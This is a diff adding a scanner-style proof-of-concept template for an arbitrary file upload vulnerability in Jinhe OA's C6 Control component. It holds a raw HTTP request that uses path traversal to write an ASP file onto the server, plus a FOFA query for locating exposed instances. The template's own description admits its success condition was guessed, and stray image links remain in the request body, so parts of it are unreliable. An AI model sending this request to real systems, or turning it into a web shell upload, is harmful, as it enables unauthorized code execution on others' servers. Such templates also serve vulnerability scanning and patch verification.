@@ -1,0 +1,78 @@
+id: poc-pu5o8kwirgrk0nhn
+info:
+  name: 金和Control任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pu5o8kwirgrk0nhn
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pu5o8kwirgrk0nhn
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\du1w7idk.asp HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78
+
+
+    Content-Length: 216
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+    Accept-Language: en-US;q=0.9,en;q=0.8
+
+
+    Cache-Control: max-age=0
+
+
+    Content-Type: multipart/form-data; boundary=----9fh1lo9qobtszaiahg6v
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Connection: close
+
+
+
+
+    ------9fh1lo9qobtszaiahg6v
+
+
+    Content-Disposition: form-data; name="file"; filename="du1w7idk.jpg"
+
+
+    Content-Type: image/png
+
+
+
+
+    <% response.write("nvtixjy92l1nmlw8dlwektqn3628tx1x")
+
+
+    %>
+
+
+
+
+    ------9fh1lo9qobtszaiahg6v--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717059773255-2b14168b-4637-4211-8a82-3fd1a4207fc7.png)
+
+
+    http://ip/C6/du1w7idk.asp![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717059773521-32a78bcd-9d1a-464e-9591-c2610f058d92.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
